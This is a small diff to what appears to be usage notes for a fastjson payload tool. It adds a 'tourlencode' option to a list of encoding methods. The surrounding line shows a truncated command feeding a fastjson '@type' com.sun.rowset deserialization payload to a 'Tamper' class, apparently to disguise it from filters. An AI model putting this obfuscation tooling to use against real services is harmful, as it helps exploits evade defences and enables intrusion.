@@ -21,6 +21,7 @@ java -cp fastjson_tool.jar fastjson.Tamper  "{\"abc\":{\"@type\":\"com.sun.rowse
 tohex 
 tounicode 
 tohexunicode 
+tourlencode 
 randomhex 
 randomunicode 
 addis 
